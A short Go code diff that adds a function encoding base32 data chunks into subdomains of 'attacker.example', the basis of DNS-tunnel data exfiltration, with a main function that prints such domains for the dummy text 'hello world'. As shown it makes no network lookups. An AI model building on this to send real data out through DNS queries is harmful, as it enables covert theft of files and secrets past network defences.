@@ -80,8 +80,20 @@ func createChunks(encodedString string, sessionID int, chunkSize int) []Chunk {
 	return chunks
 }
 
+func chunkToDomain(chunk Chunk) string {
+	domain := fmt.Sprintf(
+		"%d.%d.%d.%s.attacker.example",
+		chunk.ID,
+		chunk.TotalChunks,
+		chunk.Position,
+		chunk.Data,
+	)
+	return domain
+}
 func main() {
 	dummyText := "hello world"
-
-	fmt.Println(encodeBase32(dummyText))
+	chunks := createChunks(encodeBase32(dummyText), 1, 8)
+	for _, v := range chunks {
+		fmt.Println(chunkToDomain(v))
+	}
 }
